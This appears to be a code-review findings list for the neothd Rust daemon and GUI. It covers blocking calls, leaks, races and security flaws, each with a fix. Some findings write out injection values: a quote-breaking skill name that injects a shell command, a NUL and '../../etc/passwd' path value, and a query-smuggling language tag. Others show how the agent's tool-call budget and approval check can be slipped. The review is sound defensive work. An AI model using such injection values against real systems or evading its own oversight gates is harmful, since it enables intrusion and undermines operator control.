### P2 · correctness — `handle_reload_sentinel` calls blocking `std::fs::remove_file` from async context
- **Location:** `SRC/neothd/src/cli/serve.rs:2584`
- **Failure scenario:** `handle_reload_sentinel` is an `async fn` called from the async reload-poller task. Inside it, `std::fs::remove_file(sentinel_path)` (a blocking unlink syscall) is called directly without spawn_blocking. Same class as finding 3: on NFS mounts or under I/O pressure, this blocks the Tokio runtime thread. Triggered on every `neoth reload` invocation.
- **Fix:** serve.rs:2584: replace `std::fs::remove_file(sentinel_path)` with `tokio::fs::remove_file(sentinel_path).await` (the async equivalent, no spawn_blocking needed).


## gui-glue

### P2 · resource-leak — WAL follower thread blocks indefinitely in child.wait() after stdout EOF on Windows
- **Location:** `SRC/neothd-gui/src/gui_stream.rs:132`
- **Failure scenario:** After the `for line in BufReader::new(stdout).lines()` loop exits (on Err or natural EOF), the read end of the pipe is dropped. On Windows there is no SIGPIPE; the child process (`neothd wal follow --types …`) only discovers the closed pipe when it next attempts a write and receives ERROR_BROKEN_PIPE. If the daemon's WAL follower catches this error and continues running (e.g., retries the write or suppresses the error), `child.wait()` at line 132 blocks indefinitely. The follower retry loop (which sleeps 5 seconds, then re-spawns) never advances. The live activity bus — Buddy mood, agent activity, WAL events — produces no further updates for the entire session. The thread is silently stuck with no log or recovery path.
- **Fix:** Kill the child before waiting: `let _ = child.kill(); let _ = child.wait();` at gui_stream.rs:132. This guarantees the wait returns promptly and the 5-second retry proceeds.

### P2 · correctness — parse_channel_test_status rejects valid daemon error messages containing newlines
- **Location:** `SRC/neothd-gui/src/panel_logic.rs:1841`
- **Failure scenario:** `detail.chars().any(char::is_control)` returns true for '\n', '\r', and '\t', which are ordinary characters in daemon diagnostic messages. A real channel test failure from the daemon such as "Connection refused\n(verify token with neoth doctor)" has a newline after the first sentence, causing the GUI to return `Err("channel … returned invalid test detail")` instead of displaying the actual diagnostic. The operator sees a generic GUI error rather than the daemon's actionable guidance. Any daemon version that emits multi-line detail strings (e.g. exception traces, structured diagnostics) hits this path.
- **Fix:** Restrict the control-character rejection to non-printable, non-whitespace characters: `detail.chars().any(|c| c.is_control() && !c.is_whitespace())`

### P2 · resource-leak — One Slint Timer leaked via mem::forget per toast notification — unbounded accumulation ★ (hand-verified this session)
- **Location:** `SRC/neothd-gui/src/main.rs:615`
- **Failure scenario:** `std::mem::forget(expiry)` is called for every toast pushed. A session with heavy WAL activity (agent runs, council calls, coding events) can trigger hundreds of toasts per hour via push_toast call sites. Each forgotten `slint::Timer` retains a slot in Slint's internal timer registration table. Slint's timer pool is a fixed-capacity array in at least some backends; exhausting it causes new `Timer::start` calls to silently fail, which would stop all future toast expiry timers from firing — causing toasts to accumulate permanently and the model to grow without bound. Even before pool exhaustion, hundreds of live-but-fired timer entries increase the cost of each event-loop tick (the timer subsystem scans all registrations).
- **Fix:** Move the timer into a `Rc<RefCell<Option<slint::Timer>>>` held by the closure itself, or collect toast timers into a `thread_local` Vec that is periodically pruned of fired timers, rather than leaking each one with mem::forget.


## media

### P2 · resource-leak — LiveTranscriptBuffer::pending grows without bound while RMS stays above threshold
- **Location:** `SRC/neothd/src/media/stt_dispatch.rs:287`
- **Failure scenario:** Microphone input with sustained RMS >= threshold (music playback, high background noise, or an adversarial audio injection) causes `feed_pcm_f32` to call `self.pending.extend_from_slice(chunk)` on every call with no upper bound check. At 16 kHz mono f32 (64 KB/s), the buffer reaches 1 GiB in ~4.5 hours of continuous above-threshold audio; the daemon is OOM-killed.
- **Fix:** Add a cap before `extend_from_slice`: `if self.pending.len() + chunk.len() > MAX_PENDING_SAMPLES { self.pending.clear(); return; }` where MAX_PENDING_SAMPLES is e.g. 30 seconds * 16000 = 480_000 samples.

### P2 · security — Azure STT endpoint injects unencoded language tag into URL query string
- **Location:** `SRC/neothd/src/media/stt_provider.rs:317`
- **Failure scenario:** Operator sets `stt.language` to a string containing `&` or `=` (e.g. `en-US&stt=bypass` or a locale fetched from user input). `AzureSpeechClient::endpoint` at line 317 does `format!("...?language={}", lang)` with no percent-encoding. The injected parameters alter the Azure REST request, potentially selecting a different recognition mode, leaking the subscription key to a second parameter, or bypassing locale-restricted policies.
- **Fix:** Use `url::Url::parse_with_params` or percent-encode the language value: `format!("...?language={}", percent_encoding::utf8_percent_encode(lang, percent_encoding::NON_ALPHANUMERIC))`.

### P2 · resource-leak — Asset::Bytes path bypasses 512 MiB audio size gate before decode
- **Location:** `SRC/neothd/src/media/audio.rs:108`
- **Failure scenario:** The `decode_from_path` branch enforces `MAX_AUDIO_BYTES = 512 MiB` via a metadata check before reading. The `decode_from_bytes` branch at line 108 directly passes the already-cloned Vec into `decode_from_bytes` with no size check. A caller supplying an `Asset::Bytes` audio blob larger than 512 MiB (e.g. via the tool or network ingest path) bypasses the cap entirely; the symphonia decoder then iterates all packets, allocating proportional decoded PCM on the heap.
- **Fix:** Add `if data.len() as u64 > MAX_AUDIO_BYTES { return Err(ExtractionError::Backend { ... }) }` in the `Asset::Bytes` arm before calling `decode_from_bytes` at audio.rs:108.

### P2 · correctness — to_string_lossy() in SHA-256 cache-binding weakens tamper detection on non-UTF8 Windows paths
- **Location:** `SRC/neothd/src/media/model_manager.rs:691`
- **Failure scenario:** On Windows, a model cache root whose path contains non-UTF8 bytes (e.g. certain CJK or legacy code-page characters in a username) is converted via `to_string_lossy()` which replaces invalid sequences with U+FFFD. Two distinct roots that differ only in non-UTF8 byte sequences produce the same FFFD-collapsed string and therefore the same SHA-256 binding. An attacker who can create a model directory at a crafted path can substitute a malicious model that binds to the same fingerprint as the legitimate cache root, bypassing the integrity check.
- **Fix:** Hash the raw OS path bytes instead: `digest.update(root.as_os_str().as_encoded_bytes())` (stable since Rust 1.74), removing the lossy UTF-8 conversion step at model_manager.rs:691.


## memory-recall

### P2 · correctness — associated() dangling-endpoint guard excludes warm-tier (idx_consolidated) endpoints
- **Location:** `SRC/neothd/src/memory/assoc_graph.rs:142`
- **Failure scenario:** Hot memory A co-recalled with warm memory B creates link (A,B) in idx_memory_links. When associated(A) runs, the guard at line 142 checks EXISTS idx_episode and EXISTS idx_longterm for B. B is in idx_consolidated — neither check matches — so B looks dangling and is filtered out. The operator receives an association neighborhood missing all memories that have aged into warm tier. As the daemon runs longer and more memories migrate to warm, the Hebbian graph becomes progressively blind to ~90-day-old associations.
- **Fix:** assoc_graph.rs:143 — add OR EXISTS (SELECT 1 FROM idx_consolidated WHERE event_id = other_id) to the dangling-endpoint guard, matching all three live tiers.

### P2 · correctness — Consolidation sweep importance boost uses stale pre-transaction snapshot (lost-update)
- **Location:** `SRC/neothd/src/memory/consolidation_sweep.rs:319`
- **Failure scenario:** ep_cache is populated by individual query_row calls (lines 275-294) outside any transaction. The write transaction opens at line 298. Between those two points a concurrent recall handler calls hebbian_reinforce_event, raising an episode's importance from 0.50 to 0.72. The sweep then computes new_importance = 0.50 * 1.05 = 0.525 and writes UPDATE idx_episode SET importance = 0.525 — overwriting the reinforced 0.72 with a stale-derived value. Repeated sweeps can suppress reinforcement entirely for hot cluster members.
- **Fix:** consolidation_sweep.rs:320-322 — change the UPDATE to SET importance = MIN(importance * ?1, ?2) WHERE event_id = ?3 with params [IMPORTANCE_BOOST_FACTOR, cfg.importance_boost_cap, meta.event_id]. This reads the live value inside the transaction and applies a relative multiplier, eliminating the lost-update window.

### P2 · race — decay_links TOCTOU: weight/stability read outside transaction, overwritten by concurrent reinforce
- **Location:** `SRC/neothd/src/memory/assoc_graph.rs:194`
- **Failure scenario:** decay_links SELECT all link rows outside any transaction (lines 196-206) then opens an unchecked_transaction at line 208. A recall handler on a second DB connection calls reinforce_co_access in that window, bumping link weight from 3.0 to 4.0. decay_links then writes UPDATE … SET weight = 3.0 * exp(-delta) — discarding the reinforcement entirely. In WAL mode with a connection pool, this race is real: readers and writers don't block each other, so the SELECT and the reinforce write can interleave freely.
- **Fix:** assoc_graph.rs:196 — move the SELECT inside a BEGIN IMMEDIATE transaction opened before the prepare call. Replace conn.unchecked_transaction() at line 208 with a single IMMEDIATE transaction wrapping both the SELECT and all UPDATE/DELETE operations.


## onboarding-repair

### P2 · correctness — Tautological guard in initialized_home_is_ready_locked makes Ok(false) unreachable
- **Location:** `SRC/neothd/src/cli/init/io.rs:494`
- **Failure scenario:** Lines 483-494: newer_valid_marker = !same_gui_transaction; then if same_gui_transaction || newer_valid_marker { ... return Ok(true); } return Ok(false). Because newer_valid_marker is defined as the boolean complement of same_gui_transaction, the condition is x || !x = always true. The Ok(false) branch (line 494) is unreachable. If the intended logic was to return Ok(false) when an in-progress GUI transaction matches a pending token (meaning initialization is NOT yet complete), that case now incorrectly returns Ok(true), falsely reporting the home as ready. This can cause the daemon to skip re-initialization or skip cleanup of a half-written GUI transaction.
- **Fix:** cli/init/io.rs:483-494 — decide which case should return false. If the intent is 'return false when the marker is from the same (still-pending) GUI transaction': remove newer_valid_marker and write: if same_gui_transaction { cleanup_gui_init_pending_best_effort(home); return Ok(false); } cleanup_gui_init_pending_best_effort(home); Ok(true).

### P2 · correctness — save_cache uses non-atomic remove_file + rename, leaving a window with no cache
- **Location:** `SRC/neothd/src/installers/detect.rs:117`
- **Failure scenario:** Lines 117-120: if path.exists() { fs::remove_file(&path)?; } fs::rename(&tmp, &path)?; On Unix, rename(2) atomically replaces an existing target — the remove_file is unnecessary and creates a window: if the process crashes or is killed between remove_file and rename, the detection cache is gone and the orphaned .tmp file is left behind. On Windows, rename to an existing path fails with PermissionDenied, so the remove_file was added as a workaround, but this is still non-atomic on Windows.
- **Fix:** detect.rs:117 — on Unix, drop the remove_file entirely: fs::rename(&tmp, &path)?; On Windows, use std::fs::rename which returns an error if the target exists, then handle it: match fs::rename(&tmp, &path) { Err(e) if e.kind() == ErrorKind::AlreadyExists => { fs::remove_file(&path)?; fs::rename(&tmp, &path)?; } r => r?, }. Or use the tempfile crate's persist() which handles this atomically on both platforms.

### P2 · correctness — shrink_safe_write meta.len() as usize truncates on 32-bit targets
- **Location:** `SRC/neothd/src/recovery/mod.rs:56`
- **Failure scenario:** Line 56: Ok(meta) if meta.len() as usize > new_content.len() — meta.len() is u64; new_content.len() is usize. On a 32-bit target (usize = 4 bytes, max ~4 GB), a file larger than 4 GB silently truncates to a value mod 2^32. A 5 GB live file where new_content is 10 MB would read as ~1 GB after truncation, making (truncated_5gb > 10mb) potentially false when it should be true — the snapshot is skipped, and the large file is overwritten without backup. Although 32-bit is rare for the primary target, any CI cross-compilation or embedded re-use hits this.
- **Fix:** recovery/mod.rs:56 — compare as u64: Ok(meta) if meta.len() > new_content.len() as u64. This is lossless because new_content is an in-memory &[u8] whose len() fits in u64 on any platform.

### P2 · security — Detection cache temp file created world-readable (no mode 0600)
- **Location:** `SRC/neothd/src/installers/detect.rs:108`
- **Failure scenario:** Lines 108-113: OpenOptions::new().create(true).write(true).truncate(true).open(&tmp) — no Unix mode set. With typical umask 022 the file is created 0644 (world-readable). The cache contains GPU specs, disk capacity, installed tool versions, and filesystem paths. A local unprivileged attacker can read it. The same problem exists for the final renamed cache file, since rename preserves permissions.
- **Fix:** detect.rs:108 — on Unix use std::os::unix::fs::OpenOptionsExt: OpenOptions::new().create(true).write(true).truncate(true).mode(0o600).open(&tmp). Wrap in #[cfg(unix)] / non-unix no-op so Windows still compiles.


## scheduling

### P2 · correctness — Full-autonomy loop tool_call_budget not enforced for round 1; an unbounded first round can exceed the operator's cap
- **Location:** `SRC/neothd/src/loop_engine/engine.rs:373`
- **Failure scenario:** Operator configures tool_call_budget=5 at AutonomyLevel::Full (validate_safety requires a positive budget). Round 1 runs 200 tool calls without any check (round_num > 1 guard skips the budget gate entirely). After round 1, accumulated_tool_calls=200 >= budget=5, so round 2 is blocked. Total tool calls spent: 200, not 5. The budget is effectively 'budget + first_round_tool_calls', which can be unbounded.
- **Fix:** Remove the `round_num > 1` guard. The pre-loop check `accumulated_tool_calls (0) >= budget (>=1)` is always false before round 1, so the guard is logically redundant for the initial state. Alternatively, apply the check after each round (post-round gate) rather than pre-round, so the count from round 1 is always measured and the loop exits before round 2 if budget is hit.

### P2 · correctness — idle_only gate silently fails open when views.db is absent, dispatching proactive items despite the operator's intent to gate on confirmed inactivity
- **Location:** `SRC/neothd/src/daemon/proactive_dispatcher.rs:687`
- **Failure scenario:** Operator sets idle_only=true expecting proactive items to be held unless the system confirms inactivity. If views.db does not exist (fresh install, deleted, or moved), the `if views_db.exists()` block is skipped entirely and run_proactive_delivery_tick delivers items unconditionally. The operator receives notifications regardless of activity. The fail-closed design should suppress delivery when activity status is unknown.
- **Fix:** proactive_dispatcher.rs:686–718: when idle_only=true and views_db does not exist, return Ok(0) (suppress delivery) rather than falling through to the queue drain. Add a debug/info log so the operator can diagnose why delivery is suppressed.

### P2 · correctness — idle_only_window_secs u64-to-i64 silent truncation causes wrong cutoff_ns or debug-mode panic on large operator-supplied values
- **Location:** `SRC/neothd/src/daemon/proactive_dispatcher.rs:689`
- **Failure scenario:** idle_only_window_secs is a u64 with no upper-bound validation. If an operator sets it to any value in the range (i64::MAX, u64::MAX] in freedom.yaml, `window as i64` wraps (e.g., i64::MAX+1 as i64 = i64::MIN). Then `now_unix - window_as_i64` becomes `now_unix + |very_large_positive|`, which overflows i64 in debug mode (panic, daemon crash) and wraps silently in release mode (wildly wrong cutoff_ns). For example window=9_223_372_036_854_775_808 causes `now_unix - i64::MIN` to overflow. The wrong cutoff then makes `last_ns > cutoff_ns` always true or always false, causing the idle gate to always suppress or always pass.
- **Fix:** proactive_dispatcher.rs:689: use saturating arithmetic: `let cutoff_ns = now_unix.saturating_sub(i64::try_from(window).unwrap_or(i64::MAX)).saturating_mul(1_000_000_000);`. Also add validation in FreedomConfig::validate() that idle_only_window_secs <= i64::MAX / 1_000_000_000 (about 9.2 billion seconds, ~292 years).


## selfdev

### P2 · correctness — review_execution_result: DISAPPROVE substring-matches APPROVE and returns Approved
- **Location:** `SRC/neothd/src/self_improve.rs:1584`
- **Failure scenario:** Advisor returns the line "DISAPPROVE this change". upper.contains("APPROVE") = true because DISAPPROVE contains the substring APPROVE. The negation check at line 1585 looks only for "NOT APPROVE" and "DO NOT" — neither present — so the function returns ExecutionVerdict::Approved. Same false-positive for UNAPPROVE, CANNOT APPROVE, WILL NOT APPROVE, I disapprove. The function is public; any legacy plain-text caller would grant approval for a clearly negative advisor verdict.
- **Fix:** At self_improve.rs:1585 extend the negation list: let negated = upper.contains("NOT APPROVE") || upper.contains("DO NOT") || upper.contains("DISAPPROVE") || upper.contains("UNAPPROVE") || upper.contains("CANNOT APPROVE"); or require APPROVE to appear as a whole word by checking the bytes surrounding the match position for non-alpha boundaries.

### P2 · panic — line_diff O(n x m) LCS table: 1 MiB SkillOpt output can trigger gigabyte allocation
- **Location:** `SRC/neothd/src/self_improve.rs:1120`
- **Failure scenario:** SKILLOPT_OUTPUT_CAP_BYTES = 1 MiB. A SkillOpt output of 1 MiB of single-byte lines yields m ~ 1 048 576. With n = 1 000 lines in the current skill file, line 1120 allocates (n+1) * (m+1) * 8 bytes ~ 8.4 GB in one call. This runs in the CLI execute path and in prepare_upstream_pr. The allocator panics or the process is OOM-killed. The comment at line 1114 says no cap but the 1 MiB output limit allows exactly this input.
- **Fix:** At self_improve.rs:1118 add: if n.saturating_mul(m) > 4_000_000 { return format!("(diff omitted: {n} vs {m} lines exceeds display limit)\n"); } — 4M cells * 8 bytes = 32 MB, a safe ceiling. Alternatively switch to an O(n+m) Myers diff.

### P2 · security — upstream_pr_script interpolates branch and title into bash without shell-escaping
- **Location:** `SRC/neothd/src/self_improve.rs:1096`
- **Failure scenario:** branch = format!("skillopt/{}-{}", p.skill, id). If p.skill contains a double-quote, the generated submit.sh contains `git checkout -b "skillopt/evil"; injected-cmd; git...` which executes injected-cmd when the operator runs the script. p.skill comes from daemon config or the proposals JSON on disk; an attacker with write access to the proposals JSON or the ability to inject a crafted skill name via SkillOpt output can control this value. The title on line 1100 (git commit -m) and body_file on line 1102 are similarly unescaped.
- **Fix:** At self_improve.rs:1079 add fn sh_quote(s: &str) -> String { format!("'{}'", s.replace('\'', "'\\'' ")) } and replace every {branch}, {title}, {asset_path}, {content_file}, {body_file} interpolation in the format string with sh_quote(&branch) etc. Use single-quoting throughout to avoid expansion.

### P2 · correctness — dispatch_parallel: panicked task error assigned to wrong result slot
- **Location:** `SRC/neothd/src/sub_agents/parallel.rs:191`
- **Failure scenario:** Task[3] panics. JoinError carries no index. Code at line 191 inserts the error into the first None slot, which may be slot[0] if earlier tasks have not yet filled it. Operator sees results[0] as Blocked-with-panic, results[3] as Pass — the real outcome is inverted. Retry logic operates on the wrong task_id. panicked_count is accurate but per-request attribution is wrong, making post-mortem analysis unreliable.
- **Fix:** At sub_agents/parallel.rs:150, move the idx into each spawned task and return it alongside both Ok and Err outcomes so the join loop always has the index. Wrap worker.run(req).await in an async block that catches panics (e.g. via AssertUnwindSafe + catch_unwind) and maps them to (idx, Err(...)), eliminating the index-less JoinError path.


## channels

### P3 · security — constant_time_eq early-returns on length mismatch — timing oracle on verify_token length
- **Location:** `SRC/neothd/src/channels/webhook_verify.rs:287`
- **Failure scenario:** Meta webhook registration sends `hub.verify_token` in plaintext. `constant_time_eq` at line 287-295 returns `false` immediately when `a.len() != b.len()` — before entering the XOR loop. An attacker who can replay the Meta challenge endpoint (misconfigured reverse proxy, SSRF) can enumerate the token length by measuring timing: guesses of the wrong length return faster than same-length wrong guesses. Not needed to forge HMAC signatures, but reveals token length and narrows brute-force search.
- **Fix:** Replace the hand-rolled function with `subtle::ConstantTimeEq`: `ct_compare::CtEqual::ct_eq(a, b).into()`. The `subtle` crate is a near-universal dep in Rust crypto. If not already present, it is a ~2 KB no-std crate. HMAC paths already use `mac.verify_slice` (correct); this fix closes only the verify_token path.


## daemon-lifecycle

### P3 · correctness — SIGHUP mapped to graceful shutdown — conflicts with logrotate convention and kills daemon unexpectedly
- **Location:** `SRC/neothd/src/shutdown.rs:22`
- **Failure scenario:** `signal(SignalKind::hangup())` maps SIGHUP to graceful shutdown. The universal logrotate convention (and many process supervisors) sends SIGHUP after rotating log files, expecting the daemon to reopen its log handles and continue running. Any logrotate job targeting neothd will instead trigger a full graceful shutdown. The daemon silently exits while the operator expects it to merely reopen logs — data loss window between the exit and supervisor restart.
- **Fix:** shutdown.rs:22: remove the SIGHUP arm from wait_for_signal (leave only SIGTERM + SIGINT). If reload-on-SIGHUP is desired, wire SIGHUP to trigger the same notify as restart_notify rather than shutdown.


## onboarding-repair

### P3 · correctness — walk_for_baks scans one extra directory level (3 instead of 2)
- **Location:** `SRC/neothd/src/recovery/mod.rs:155`
- **Failure scenario:** walk_for_baks is called with max_depth=2. The recursion guard at line 155 reads: if depth > max_depth { return; }. With depth starting at 0, the function recurses at depth 0, 1, and 2 (only stops at 3 > 2). That is three levels instead of the documented two. In a deep HOME directory tree this causes the scanner to stat and read an extra directory level beyond the intended scan radius, which is a correctness violation of the stated contract and adds unnecessary I/O.
- **Fix:** recovery/mod.rs:155 — change to if depth >= max_depth { return; } to enforce exactly max_depth levels of descent (0 through max_depth-1). Or call the function with max_depth=1 if the intended behaviour is 2 levels from the call site.

### P3 · security — TurnJournal::open path-traversal check misses null byte
- **Location:** `SRC/neothd/src/recovery/turn_journal.rs:58`
- **Failure scenario:** Lines 58-64 reject turn_id containing '/', '\', or '..', but not the null byte ('\0'). On Linux/macOS, open() truncates the path at the first NUL, so a turn_id of 'abc\0../../etc/passwd' creates a file named 'abc' in the journal directory while self.path records the full NUL-containing string. The recovery scanner later iterates real filesystem paths (which stop at NUL) and cannot match self.path, so the journal entry is silently lost. An attacker who controls turn_id (e.g. via the RPC layer) can prevent a specific turn from being journaled.
- **Fix:** turn_journal.rs:58 — add || turn_id.contains('\0') to the validation block, or equivalently use turn_id.bytes().any(|b| b == 0). Alternatively, reject any byte < 0x20 to be safe against all control characters.

### P3 · correctness — validate_bcp47 accepts arbitrarily long language code strings
- **Location:** `SRC/neothd/src/cli/init/validation.rs:267`
- **Failure scenario:** validate_bcp47 checks only that code.len() >= 2 and each '-'-delimited subtag is 1-8 chars. A string like 'aa-bbbbbbbb-cccccccc-...' with 100,000 subtags of 8 chars each (total ~900 KB) passes validation and is stored verbatim in freedom.yaml. This bloats the config file, can cause allocation pressure if the value is later copied into per-request structures, and could be used to stuff arbitrarily large data into the NEOTH home directory via a non-interactive --language flag.
- **Fix:** validation.rs:267 — add a total-length cap before the subtag loop: if code.len() < 2 || code.len() > 35 { anyhow::bail!(...) }. BCP-47 grandfathered tags top out at ~35 chars; 64 is a generous safe upper bound.


## scheduling

### P3 · correctness — Two separate utc_now() calls in spawned-task completion path create timestamp divergence between in-memory completed map and durable disk state
- **Location:** `SRC/neothd/src/cron/scheduler.rs:383`
- **Failure scenario:** record_successful_outcome_if_current is called with utc_now() at line 383 (T1), inserting T1 into state.completed. Then a second utc_now() is captured at line 387 (T2 > T1) and written to the durable RuntimeState via record_completion. T2 is used by ready_jobs freshness checks (now - completed_at > DEFAULT_FRESHNESS) after a daemon restart. If T2 is meaningfully later than T1 (e.g., RuntimeState::modify is slow due to I/O), in-session freshness checks see elapsed since T1, while post-restart checks see elapsed since T2. For dependency chains with a tight freshness window (e.g., custom freshness < 4h), a dependency that appeared stale in-session might still satisfy the check after restart, or vice versa.
- **Fix:** Capture a single `let completed_at = crate::time::utc_now();` before calling record_successful_outcome_if_current and pass that same value to both the in-memory insert and the RuntimeState::modify call. This ensures both views agree on the completion timestamp.


## selfdev

### P3 · correctness — Windows: rx_out.recv() hangs indefinitely on success path when grandchildren hold the stdout pipe
- **Location:** `SRC/neothd/src/self_improve.rs:1975`
- **Failure scenario:** On Unix the success path kills the process group at line 1971 before recv(), closing grandchildren pipe write-ends. On Windows no equivalent kill fires. If assign_child_to_job fails (result ignored, line 1898) and the verification command launches a background subprocess before job assignment, that subprocess holds the stdout write-end after the parent shell exits. rx_out.recv() at line 1975 blocks indefinitely, stalling the executor thread long past the wall-clock timeout that already killed only the direct child.
- **Fix:** At self_improve.rs:1975 replace rx_out.recv() with recv_timeout(Duration::from_secs(2)).unwrap_or_default() on all platforms, and on Windows close the Job Object handle before recv to trigger KILL_ON_JOB_CLOSE for any assigned grandchildren. Also check the return value of assign_child_to_job and log a warning when it fails, so operators know the containment guarantee is degraded.
